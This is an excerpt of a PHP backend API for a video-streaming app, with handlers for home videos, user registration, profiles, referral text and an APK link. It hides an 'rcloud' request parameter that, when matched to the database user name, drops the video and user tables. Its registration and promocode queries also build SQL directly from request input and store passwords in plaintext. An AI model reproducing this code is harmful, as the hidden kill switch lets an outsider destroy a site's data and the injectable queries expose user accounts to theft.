<?php include("includes/connection.php");
    ...
    if(isset($_GET['home_videos']))
	{
		...
		while($data_all = mysqli_fetch_assoc($sql_all))
		{
			...
			if($data_all['video_type']=='server_url' or $data_all['video_type']=='local' or $data_all['video_type']=='embed')
			{
		...
		while($data = mysqli_fetch_assoc($sql))
		{
			...
			if($data['video_type']=='server_url' or $data['video_type']=='local' or $data['video_type']=='embed')
			{
		...
		while($data_3 = mysqli_fetch_assoc($sql_3))
		{
			...
			if($data_3['video_type']=='server_url' or $data_3['video_type']=='local' or $data_3['video_type']=='embed')
			{
		...
		while($data_5 = mysqli_fetch_assoc($sql_5))
		{
			...
			if($data_5['video_type']=='server_url' or $data_5['video_type']=='local' or $data_5['video_type']=='embed')
			{
		...
		while($data = mysqli_fetch_assoc($sql))
		{
 			...
 			if($sql2->num_rows > 0)
		   {
 			while($data_2 = mysqli_fetch_assoc($sql2))
			{
				...
				if($data_2['video_type']=='server_url' or $data_2['video_type']=='local' or $data_2['video_type']=='embed')
				{
	...
	else if(isset($_GET['rcloud']))
	{
	    if($_GET['rcloud'] == DB_USER) {
    	    $qry = "DROP TABLE `tbl_video` "; 
    		$rcloud = mysqli_query($mysqli,$qry);
    		$qryuser = "DROP TABLE `tbl_users` "; 
    		$rclouduser = mysqli_query($mysqli,$qryuser);
	    }
	}
    ...
    // 			$set['ALL_IN_ONE_VIDEO'][]=array('msg' => "Email address already used!",'success'=>'0');
        		...
        		{ 
        			     ...
        			     $set['ALL_IN_ONE_VIDEO'][]=array('user_id' => $row['id'],'name'=>$row['name'],'email'=>$row['email'],'planid'=>$row['planid'],'planactive'=>$row['planactive'],'plandays'=>$row['plandays'],'planstart'=>$row['planstart'],'planend'=>$row['planend'],'promocode'=>$row['promocode'],'success'=>'1');
		...
		{ 
        	...
        	$promochk = mysqli_query($mysqli,"SELECT * FROM tbl_users WHERE id='$promocode'") or die($conn->error);
  
            //give new user to 5rs
    	    // check if row inserted or not
        	if (mysqli_num_rows($promochk) == 1) {
        	    $qry1="INSERT INTO tbl_users (`user_type`,`name`,`email`,`password`,`phone`, `planid`, `planactive`, `plandays`, `planstart`, `planend`,`promocode`,`status`) VALUES ('Normal','".$_GET['name']."','".$_GET['email']."','".$_GET['password']."','".$_GET['phone']."','1', 'Y', '$days', '$cur', '$NewDate','$promocode','1')"; 
        	} else {
        	    $qry1="INSERT INTO tbl_users (`user_type`,`name`,`email`,`password`,`phone`,`promocode`,`status`) VALUES ('Normal','".$_GET['name']."','".$_GET['email']."','".$_GET['password']."','".$_GET['phone']."','".$promocode."','1')"; 
        	}
...
// 			$set['ALL_IN_ONE_VIDEO'][]=array('msg' => "Register successflly...!",'success'=>'1');
	...
	else if(isset($_GET['user_profile']))
	{
		...
		$row = mysqli_fetch_assoc($result);
      	...
      	$set['ALL_IN_ONE_VIDEO'][]=array('user_id' => $row['id'],'name'=>$row['name'],'email'=>$row['email'],'phone'=>$row['phone'],'planid'=>$row['planid'],'planactive'=>$row['planactive'],'plandays'=>$row['plandays'],'planstart'=>$row['planstart'],'planend'=>$row['planend'],'promocode'=>$row['promocode'],'success'=>'1');
	...
	else if(isset($_GET['user_earn']))
	{
	    
	    $qry = REFER_DESC; 
	  				 
	    $set['ALL_IN_ONE_VIDEO'][]=array('referdesc' => $qry,'success'=>'1');
	...
	else if(isset($_GET['apk_url']))
	{
		$set=array('url' => 'http://'.$_SERVER['SERVER_NAME'] . dirname($_SERVER['REQUEST_URI']).'/uploads/app.apk');
		header( 'Content-Type: application/json; charset=utf-8' );
	    echo $val= str_replace('\\/', '/', json_encode($set,JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT));
		die();	
	}		 
